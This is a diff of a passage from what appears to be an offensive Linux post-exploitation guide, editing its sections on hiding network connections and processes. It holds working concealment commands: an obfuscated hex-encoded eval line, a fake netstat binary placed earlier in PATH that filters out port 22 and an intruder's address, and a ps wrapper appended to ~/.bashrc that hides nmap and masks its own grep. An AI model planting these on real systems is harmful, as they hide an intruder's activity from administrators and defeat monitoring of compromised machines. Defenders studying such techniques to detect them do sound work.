@@ -153,7 +153,7 @@ eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c20
 
 **Method 2 - Hiding a connection with a binary in $PATH**
 
-Hide a fake netstat binary in /usr/local/sbin whereas the real netstat is in /usr/bin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.
+Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.
 
 ```shell
 echo -e "#! /bin/bash
@@ -166,7 +166,7 @@ exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/net
 
 <a id="hide-a-process-user"></a>
 
-Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process:
+Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the ps list by renaming it to GREP:
 
 ```shell
 echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc
